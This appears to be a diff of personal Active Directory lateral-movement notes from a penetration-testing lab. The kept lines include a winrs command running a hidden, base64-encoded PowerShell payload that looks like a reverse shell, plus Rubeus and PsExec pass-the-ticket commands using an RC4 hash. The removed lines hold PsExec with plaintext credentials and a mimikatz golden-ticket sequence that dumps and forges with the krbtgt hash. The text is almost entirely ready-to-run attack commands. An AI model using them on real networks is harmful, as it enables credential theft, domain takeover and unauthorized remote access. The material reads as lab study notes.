@@ -3,13 +3,7 @@ winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBl
 HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
 
 ---------------------------------------------------------------------------------------------------------------------------
-#PSExec
-1. User to be part of the Administrators local group.
-2. ADMIN$ share must be available
-3. File and Printer Sharing has to be turned on
 
-./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
----------------------------------------------------------------------------------------------------------------------------
 #PassTheTicket
 
 #Load the ticket in memory using mimikatz or Rubeus
@@ -28,25 +22,6 @@ python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
----------------------------------------------------------------------------------------------------------------------------
-#Golden Ticket
-
-If we can get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden ticket
-
-This password is only changed when the domain functional level is upgraded from a pre-2008 Windows server, but not from a newer version. Because of this, it is not uncommon to find very old krbtgt password hashes.
-
-#on domain controller
-mimikatz
-privilege::debug
-lsadump::lsa /patch
-
-kerberos::purge
-kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
-misc::cmd
-
-PsExec.exe \\dc1 cmd.exe
-
-If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked.
 ---------------------------------------------------------------------------------------------------------------------------
 #DCOM
 ---------------------------------------------------------------------------------------------------------------------------
